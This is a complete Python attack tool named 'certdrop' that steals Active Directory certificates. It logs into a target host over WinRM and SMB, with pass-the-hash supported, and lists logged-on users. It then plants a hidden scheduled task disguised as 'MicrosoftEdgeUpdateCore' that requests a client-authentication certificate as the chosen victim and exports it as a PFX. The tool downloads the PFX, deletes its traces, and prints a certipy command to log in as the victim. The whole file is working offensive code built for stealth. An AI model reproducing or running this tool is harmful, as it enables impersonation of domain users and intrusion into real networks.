#!/usr/bin/env python3
"""
certdrop - ADCS cert theft via scheduled task session hijack

Enumerates active sessions on a target host, lets you pick a user, then
drops a scheduled task that requests an ADCS certificate as that user
(running in their live session context) and exports it as a PFX.

Usage:
  certdrop.py TARGET -u USER -p PASS -d DOMAIN --dc-ip DC_IP
  certdrop.py TARGET -u USER -H :NTHASH -d DOMAIN --dc-ip DC_IP
  certdrop.py TARGET -u USER -p PASS -d DOMAIN --dc-ip DC_IP -ca "CA_HOST\\CA_NAME"

Examples:
  certdrop.py ecorp-sql -u veeam-admin -p 'B@ckupP@ssw0rd' -d ecorp.local --dc-ip 192.168.15.40
  certdrop.py 192.168.15.42 -u administrator -H :df7b0bd625b1abd59211a47eac55791f -d ecorp.local --dc-ip 192.168.15.40
"""

import argparse
import atexit
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import io
import ipaddress
import os
import re
import socket
import sys
import tempfile
import time
from datetime import datetime, timedelta

import winrm
from impacket.krb5 import constants
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection

try:
    import dns.resolver as _dns_resolver
    _HAS_DNSPYTHON = True
except ImportError:
    _HAS_DNSPYTHON = False

try:
    from ldap3 import Server, Connection, NTLM, ALL
    _HAS_LDAP3 = True
except ImportError:
    _HAS_LDAP3 = False


# ── Templates ─────────────────────────────────────────────────────────────────

CERT_INF = """\
[Version]
Signature="$Windows NT$"
[NewRequest]
Subject = "CN={cn}"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2
[RequestAttributes]
CertificateTemplate = {template}
"""

# findstr covers English ("Cert Hash") and French ("Hach. cert.") locales
CERT_BAT = """\
@echo off
setlocal enabledelayedexpansion
set "BASE={drop_dir}\\{prefix}"
certreq -new "%BASE%.inf" "%BASE%.req" > nul
certreq -submit{ca_flag} "%BASE%.req" "%BASE%.cer" > nul
certutil -user -addstore my "%BASE%.cer" > nul
set "HASH="
for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
    set "tmp=%%A"
    set "tmp=!tmp: =!"
    set "HASH=!tmp!"
)
if "!HASH!"=="" exit /b 1
certutil -user -repairstore my !HASH! > nul 2>&1
certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot > nul 2>&1
certutil -user -delstore my !HASH! > nul 2>&1
if exist "%BASE%.pfx" (exit /b 0) else (exit /b 2)
"""

TASK_XML = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<Triggers>
   <RegistrationTrigger>
   <EndBoundary>{end_boundary}</EndBoundary>
   </RegistrationTrigger>
</Triggers>
<Principals>
   <Principal id="LocalSystem">
   <UserId>{domain}\\{username}</UserId>
   <RunLevel>HighestAvailable</RunLevel>
   </Principal>
</Principals>
<Settings>
   <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
   <AllowHardTerminate>true</AllowHardTerminate>
   <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
   <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
   <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
   <IdleSettings>
      <RestartOnIdle>false</RestartOnIdle>
      <StopOnIdleEnd>true</StopOnIdleEnd>
   </IdleSettings>
   <Hidden>true</Hidden>
   <WakeToRun>false</WakeToRun>
   <Priority>7</Priority>
   <RunOnlyIfIdle>false</RunOnlyIfIdle>
   <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
   <AllowStartOnDemand>true</AllowStartOnDemand>
   <Enabled>true</Enabled>
</Settings>
<Actions Context="LocalSystem">
   <Exec>
   <Command>{exec_cmd}</Command>
   <Arguments>{exec_args}</Arguments>
   </Exec>
</Actions>
</Task>
"""

EXEC_METHODS = {
    "conhost": {
        "cmd":  "conhost",
        "args": "--headless {drop_dir}\\{prefix}.bat",
    },
    "powershell": {
        "cmd":  "powershell.exe",
        "args": "-NonInteractive -WindowStyle Hidden -File {drop_dir}\\{prefix}.bat",
    },
    "wscript": {
        "cmd":  "wscript.exe",
        "args": "//B //NoLogo {drop_dir}\\{prefix}.vbs",
    },
}

VBS_STUB = """\
Set oShell = CreateObject("WScript.Shell")
oShell.Run "cmd.exe /c {drop_dir}\\{prefix}.bat", 0, True
"""


# ── Kerberos Setup ────────────────────────────────────────────────────────────

def setup_kerberos(username, password, nt_hash, domain, dc_ip):
    """Get TGT via impacket, write temp ccache + krb5.conf. Returns (ccache_path)."""
    conf = (
        f"[libdefaults]\n"
        f"    default_realm = {domain.upper()}\n"
        f"    dns_lookup_realm = false\n"
        f"    dns_lookup_kdc = false\n"
        f"    forwardable = true\n\n"
        f"[realms]\n"
        f"    {domain.upper()} = {{\n"
        f"        kdc = {dc_ip}\n"
        f"        admin_server = {dc_ip}\n"
        f"    }}\n\n"
        f"[domain_realm]\n"
        f"    .{domain.lower()} = {domain.upper()}\n"
        f"    {domain.lower()} = {domain.upper()}\n"
    )
    fd, krb5_path = tempfile.mkstemp(suffix=".conf", prefix="certdrop_krb5_")
    os.write(fd, conf.encode())
    os.close(fd)
    atexit.register(_safe_unlink, krb5_path)
    os.environ["KRB5_CONFIG"] = krb5_path

    lm_hash = ""
    nt = nt_hash or ""
    if nt and ":" in nt:
        lm_hash, nt = nt.split(":", 1)

    user = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, old_spa, session_key = getKerberosTGT(
        user, password or "", domain, None,
        bytes.fromhex(lm_hash) if lm_hash else None,
        bytes.fromhex(nt) if nt else None,
        dc_ip,
    )

    ccfd, cc_path = tempfile.mkstemp(suffix=".ccache", prefix="certdrop_")
    os.close(ccfd)
    cc = CCache()
    cc.fromTGT(tgt, old_spa, session_key)
    cc.saveFile(cc_path)
    atexit.register(_safe_unlink, cc_path)
    os.environ["KRB5CCNAME"] = cc_path
    return cc_path


def _safe_unlink(path):
    try:
        os.unlink(path)
    except Exception:
        pass


# ── DNS / hostname resolution ─────────────────────────────────────────────────

def _is_ip(s):
    try:
        ipaddress.ip_address(s)
        return True
    except ValueError:
        return False


def resolve_target(target, dc_ip, domain):
    """
    Returns (hostname_fqdn, ip).
    - If target is an IP: reverse-lookup against dc_ip to get the hostname.
    - If target is a hostname: forward-lookup against dc_ip to get the IP.
    """
    if _is_ip(target):
        ip = target
        hostname = None
        if _HAS_DNSPYTHON and dc_ip:
            try:
                r = _dns_resolver.Resolver()
                r.nameservers = [dc_ip]
                arpa = ".".join(reversed(ip.split("."))) + ".in-addr.arpa"
                answers = r.resolve(arpa, "PTR")
                hostname = str(answers[0]).rstrip(".")
            except Exception:
                pass
        if not hostname:
            # Fall back: try system reverse lookup
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except Exception:
                pass
        if not hostname:
            die(f"Cannot resolve hostname for {ip}. Use a hostname instead of IP.")
        return hostname, ip
    else:
        hostname = target
        if "." not in hostname:
            hostname = f"{target}.{domain}"
        ip = None
        if _HAS_DNSPYTHON and dc_ip:
            try:
                r = _dns_resolver.Resolver()
                r.nameservers = [dc_ip]
                answers = r.resolve(hostname, "A")
                ip = str(answers[0])
            except Exception:
                pass
        if not ip:
            try:
                ip = socket.gethostbyname(hostname)
            except Exception:
                pass
        if not ip:
            die(f"Cannot resolve {hostname}. Check --dc-ip or your DNS.")
        return hostname, ip


def patch_socket_for_hostname(hostname, ip):
    """Make socket resolve `hostname` → `ip` locally so Kerberos SPN stays as hostname."""
    _orig = socket.getaddrinfo

    def _patched(host, port, *args, **kwargs):
        if host == hostname:
            host = ip
        return _orig(host, port, *args, **kwargs)

    socket.getaddrinfo = _patched


# ── WinRM ─────────────────────────────────────────────────────────────────────

def winrm_session(hostname, ip, username, password, nt_hash, domain, use_krb):
    """Return a pywinrm Session object."""
    # Kerberos needs the FQDN for SPN; NTLM is happy with the IP
    endpoint = hostname if use_krb else ip
    url = f"http://{endpoint}:5985/wsman"
    if use_krb:
        return winrm.Session(url,
            auth=(f"{username}@{domain.upper()}", ""),
            transport="kerberos",
            read_timeout_sec=30,
            operation_timeout_sec=29)
    else:
        pw = password or ""
        if nt_hash:
            # NTLM PTH: pywinrm doesn't natively support PTH but we can fall through
            # to using NTLM with blank password — for PTH use nxc fallback
            pw = f":{nt_hash}" if not password else password
        return winrm.Session(url,
            auth=(f"{domain}\\{username}", pw),
            transport="ntlm",
            read_timeout_sec=30,
            operation_timeout_sec=29)


def run_cmd(sess, cmd):
    """Run a cmd.exe command via WinRM. Returns (stdout_str, stderr_str, rc)."""
    r = sess.run_cmd(cmd)
    return r.std_out.decode(errors="replace"), r.std_err.decode(errors="replace"), r.status_code


def run_ps(sess, ps):
    """Run a PowerShell snippet via WinRM."""
    r = sess.run_ps(ps)
    return r.std_out.decode(errors="replace"), r.std_err.decode(errors="replace"), r.status_code


# ── Session Enumeration ───────────────────────────────────────────────────────

def enum_sessions(sess):
    """
    Returns list of dicts: {username, session_id, state, type}.
    Filters out system/service sessions.
    """
    stdout, _, rc = run_cmd(sess, "query session")
    sessions = []
    for line in stdout.splitlines()[1:]:  # skip header
        # Format: [>]SESSIONNAME  USERNAME  ID  STATE  TYPE  DEVICE
        parts = line.split()
        if not parts:
            continue
        # Strip leading '>' marker
        parts[0] = parts[0].lstrip(">")

        # query session output varies by Windows version — parse carefully
        # Typical: rdp-tcp#4  veeam-admin  3  Active
        # Or:                 pprice       2  Disc
        # We want sessions with a real username and Active/Disc state
        m = re.match(
            r"^\s*(\S+)?\s{2,}(\S+)\s+(\d+)\s+(Active|Disc)\b",
            line,
        )
        if m:
            sname, uname, sid, state = m.group(1), m.group(2), m.group(3), m.group(4)
            sessions.append({
                "session_name": sname or "",
                "username": uname,
                "id": int(sid),
                "state": state,
            })
    return sessions


def pick_session(sessions):
    """Interactive numbered picker. Returns chosen session dict."""
    if not sessions:
        die("No active user sessions found on target.")

    print()
    print("  Active sessions:")
    print(f"  {'#':<4} {'State':<8} {'Session':<20} {'Username'}")
    print(f"  {'-'*4} {'-'*8} {'-'*20} {'-'*20}")
    for i, s in enumerate(sessions):
        print(f"  {i:<4} {s['state']:<8} {s['session_name']:<20} {s['username']}")
    print()

    while True:
        try:
            choice = input("  [?] Pick session # to target: ").strip()
            idx = int(choice)
            if 0 <= idx < len(sessions):
                return sessions[idx]
        except (ValueError, EOFError):
            pass
        print("  Invalid choice.")


# ── CA Discovery ──────────────────────────────────────────────────────────────

def discover_ca(domain, dc_ip, username, password, nt_hash):
    """Query LDAP for pKIEnrollmentService and return CA config string."""
    if not _HAS_LDAP3:
        return None
    try:
        server = Server(dc_ip, get_info=ALL)
        pw = password or ""
        conn = Connection(server,
            user=f"{domain}\\{username}",
            password=pw,
            authentication=NTLM)
        if not conn.bind():
            return None
        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        search_base = (
            f"CN=Enrollment Services,CN=Public Key Services,"
            f"CN=Services,CN=Configuration,{base_dn}"
        )
        conn.search(search_base,
            "(objectClass=pKIEnrollmentService)",
            attributes=["dNSHostName", "cn"])
        if conn.entries:
            e = conn.entries[0]
            return f"{e.dNSHostName.value}\\{e.cn.value}"
    except Exception:
        pass
    return None


# ── File Generation ───────────────────────────────────────────────────────────

def generate_files(target_user, target_domain, ca_config, template,
                   prefix, drop_dir, exec_method):
    """Returns dict of {filename: bytes}."""
    cn = f"{target_user}@{target_domain.lower()}"
    ca_flag = f' -config "{ca_config}"' if ca_config else ""

    profile  = EXEC_METHODS[exec_method]
    exec_cmd = profile["cmd"]
    exec_arg = profile["args"].format(drop_dir=drop_dir, prefix=prefix)

    # EndBoundary: now + 48h (generous buffer for timezone offsets)
    end_boundary = (datetime.now() + timedelta(hours=48)).strftime("%Y-%m-%dT%H:%M:%S.000")

    files = {}

    files[f"{prefix}.inf"] = CERT_INF.format(
        cn=cn, template=template
    ).encode("utf-8")

    files[f"{prefix}.bat"] = CERT_BAT.format(
        drop_dir=drop_dir, prefix=prefix, ca_flag=ca_flag
    ).encode("utf-8")

    files[f"{prefix}.xml"] = TASK_XML.format(
        end_boundary=end_boundary,
        domain=target_domain,
        username=target_user,
        exec_cmd=exec_cmd,
        exec_args=exec_arg,
    ).encode("utf-16")

    if exec_method == "wscript":
        files[f"{prefix}.vbs"] = VBS_STUB.format(
            drop_dir=drop_dir, prefix=prefix
        ).encode("utf-8")

    return files


# ── SMB ───────────────────────────────────────────────────────────────────────

def smb_connect(ip, hostname, username, password, nt_hash, domain, dc_ip, use_krb):
    # Kerberos SPN is cifs/<hostname> — pass hostname as remoteName
    remote_name = hostname if use_krb else ip
    smb = SMBConnection(remote_name, ip)
    if use_krb:
        smb.kerberosLogin(username, password or "", domain, "", "", "", kdcHost=dc_ip)
    elif nt_hash:
        lm, nt = ("", nt_hash)
        if ":" in nt_hash:
            lm, nt = nt_hash.split(":", 1)
        if not lm:
            lm = "aad3b435b51404eeaad3b435b51404ee"
        smb.login(username, "", domain, lmhash=lm, nthash=nt)
    else:
        smb.login(username, password, domain)
    return smb


def smb_upload(smb, files, drop_dir):
    """Upload {filename: bytes} to drop_dir on target."""
    # Convert drop_dir like C:\Windows\Tasks → share C$, path Windows/Tasks/
    share, rel = _parse_unc(drop_dir)
    for fname, data in files.items():
        remote = f"{rel}/{fname}" if rel else fname
        smb.putFile(share, remote, io.BytesIO(data).read)


def smb_download(smb, drop_dir, filename):
    """Download a file from drop_dir. Returns bytes."""
    share, rel = _parse_unc(drop_dir)
    remote = f"{rel}/{filename}" if rel else filename
    buf = io.BytesIO()
    smb.getFile(share, remote, buf.write)
    return buf.getvalue()


def _parse_unc(drop_dir):
    """C:\\Windows\\Tasks → ('C$', 'Windows/Tasks')"""
    parts = drop_dir.replace("\\", "/").split("/", 1)
    drive = parts[0].rstrip(":") + "$"
    rest  = parts[1].replace("\\", "/") if len(parts) > 1 else ""
    return drive, rest


# ── Task Management ───────────────────────────────────────────────────────────

def create_and_run_task(sess, task_name, drop_dir, prefix):
    xml_path = f"{drop_dir}\\{prefix}.xml"
    cmd = f'schtasks /create /xml "{xml_path}" /tn "{task_name}" /f'
    stdout, stderr, rc = run_cmd(sess, cmd)
    if rc != 0:
        die(f"schtasks /create failed (rc={rc}): {stderr.strip() or stdout.strip()}")
    info(f"Task '{task_name}' created")

    stdout, _, rc = run_cmd(sess, f'schtasks /run /tn "{task_name}"')
    if rc != 0:
        warn(f"schtasks /run failed (rc={rc}) — task may still fire via RegistrationTrigger")
    else:
        info("Task triggered")


def poll_for_pfx(sess, drop_dir, prefix, timeout=90):
    """Poll until cert.pfx appears or timeout. Returns True on success."""
    pfx_path = f"{drop_dir}\\{prefix}.pfx"
    deadline  = time.time() + timeout
    while time.time() < deadline:
        stdout, _, _ = run_ps(sess, f'if (Test-Path "{pfx_path}") {{"yes"}} else {{"no"}}')
        if stdout.strip().lower() == "yes":
            print()
            return True
        print(".", end="", flush=True)
        time.sleep(3)
    print()
    return False


def cleanup_target(sess, smb, task_name, drop_dir, prefix):
    run_cmd(sess, f'schtasks /delete /tn "{task_name}" /f')
    run_cmd(sess, f'cmd /c del "{drop_dir}\\{prefix}.*"')
    info("Cleaned up task and files")


# ── Output Helpers ────────────────────────────────────────────────────────────

def info(msg):  print(f"[+] {msg}")
def warn(msg):  print(f"[!] {msg}", file=sys.stderr)
def die(msg):   print(f"[-] {msg}", file=sys.stderr); sys.exit(1)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        prog="certdrop",
        description="ADCS cert theft via scheduled task session hijack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    p.add_argument("target", metavar="TARGET",
        help="Target host — hostname (preferred) or IP")

    auth = p.add_argument_group("authentication")
    auth.add_argument("-u", "--username", required=True)
    auth.add_argument("-p", "--password",  default="",
        help="Plaintext password")
    auth.add_argument("-H", "--hash",      default="",
        dest="nt_hash", metavar="[LM:]NT",
        help="NT hash for pass-the-hash (NTLM only)")
    auth.add_argument("-d", "--domain",    required=True,
        help="Domain (e.g. ecorp.local)")
    auth.add_argument("-k", "--kerberos",  action="store_true",
        help="Use Kerberos auth (requires --dc-ip)")
    auth.add_argument("--dc-ip",           default=None,
        help="Domain controller IP (for Kerberos KDC and DNS)")

    cert = p.add_argument_group("certificate")
    cert.add_argument("-ca",               default=None,
        help="CA config string CA_HOST\\CA_NAME (auto-discover if omitted)")
    cert.add_argument("-t", "--template",  default="User",
        help="Certificate template (default: User)")

    task = p.add_argument_group("task / delivery")
    task.add_argument("-n", "--task-name", default="MicrosoftEdgeUpdateCore",
        help="Scheduled task display name")
    task.add_argument("--drop-dir",        default=r"C:\Windows\Tasks",
        help=r"Drop directory on target (default: C:\Windows\Tasks)")
    task.add_argument("--prefix",          default="cert",
        help="File prefix (default: cert)")
    task.add_argument("-m", "--exec-method", default="conhost",
        choices=list(EXEC_METHODS),
        help="Execution wrapper: conhost|powershell|wscript (default: conhost)")

    p.add_argument("-o", "--out-dir", default="output",
        help="Local directory for PFX output (default: output/)")
    p.add_argument("--no-cleanup", action="store_true",
        help="Skip cleanup of task and files on target")
    p.add_argument("--timeout", type=int, default=90,
        help="Seconds to wait for PFX (default: 90)")

    args = p.parse_args()

    if args.kerberos and not args.dc_ip:
        die("Kerberos auth requires --dc-ip")
    if not args.password and not args.nt_hash:
        import getpass
        args.password = getpass.getpass(f"Password for {args.domain}\\{args.username}: ")

    # ── Resolve target ──
    print()
    info(f"Resolving target: {args.target}")
    hostname, ip = resolve_target(args.target, args.dc_ip, args.domain)
    info(f"Target: {hostname} ({ip})")

    # ── Kerberos setup ──
    if args.kerberos:
        info("Acquiring Kerberos TGT...")
        setup_kerberos(args.username, args.password, args.nt_hash, args.domain, args.dc_ip)
        info("TGT obtained — patching resolver for hostname routing")
        patch_socket_for_hostname(hostname, ip)

    # ── WinRM connect ──
    info("Connecting via WinRM...")
    try:
        sess = winrm_session(hostname, ip, args.username, args.password,
                             args.nt_hash, args.domain, args.kerberos)
        # Probe
        _, _, rc = run_cmd(sess, "echo ok")
        if rc != 0:
            die("WinRM connected but probe command failed.")
    except Exception as e:
        die(f"WinRM connection failed: {e}")
    info("WinRM connected")

    # ── Enumerate sessions ──
    info("Enumerating sessions...")
    sessions = enum_sessions(sess)
    if not sessions:
        die("No active user sessions found.")

    target_session = pick_session(sessions)
    target_user    = target_session["username"]
    info(f"Targeting session: {target_user} (ID {target_session['id']}, {target_session['state']})")

    # ── CA discovery ──
    ca_config = args.ca
    if not ca_config:
        info("Discovering CA via LDAP...")
        dc_for_ldap = args.dc_ip or ip
        ca_config = discover_ca(args.domain, dc_for_ldap,
                                args.username, args.password, args.nt_hash)
        if ca_config:
            info(f"CA found: {ca_config}")
        else:
            warn("CA auto-discovery failed — certreq will use system default (may hang if no CA is configured)")

    # ── Generate files ──
    info("Generating payload files...")
    files = generate_files(
        target_user, args.domain, ca_config, args.template,
        args.prefix, args.drop_dir, args.exec_method,
    )
    for f in files:
        info(f"  {f}")

    # ── SMB upload ──
    info(f"Uploading to {args.drop_dir}\\ via SMB...")
    try:
        smb = smb_connect(ip, hostname, args.username, args.password, args.nt_hash,
                          args.domain, args.dc_ip, args.kerberos)
        smb_upload(smb, files, args.drop_dir)
    except Exception as e:
        die(f"SMB upload failed: {e}")
    info("Upload complete")

    # ── Create and run task ──
    info("Registering scheduled task...")
    create_and_run_task(sess, args.task_name, args.drop_dir, args.prefix)

    # ── Poll for PFX ──
    info(f"Waiting for PFX (timeout: {args.timeout}s) ...")
    if not poll_for_pfx(sess, args.drop_dir, args.prefix, args.timeout):
        warn("Timed out waiting for PFX.")
        if not args.no_cleanup:
            cleanup_target(sess, smb, args.task_name, args.drop_dir, args.prefix)
        die("No PFX produced — check CA reachability and template permissions.")

    # ── Download PFX ──
    info("Downloading PFX...")
    os.makedirs(args.out_dir, exist_ok=True)
    try:
        pfx_data = smb_download(smb, args.drop_dir, f"{args.prefix}.pfx")
        out_path  = os.path.join(args.out_dir, f"{args.prefix}.pfx")
        with open(out_path, "wb") as fh:
            fh.write(pfx_data)
        info(f"Saved → {out_path} ({len(pfx_data)} bytes)")
    except Exception as e:
        die(f"PFX download failed: {e}")

    # ── Cleanup ──
    if not args.no_cleanup:
        info("Cleaning up...")
        cleanup_target(sess, smb, args.task_name, args.drop_dir, args.prefix)

    # ── Summary ──
    print()
    print("─" * 60)
    print("USE PFX")
    print("─" * 60)
    dc = args.dc_ip or "<DC_IP>"
    print(f"  certipy-ad auth -pfx {out_path} -dc-ip {dc} -domain {args.domain}")
    print()


if __name__ == "__main__":
    main()
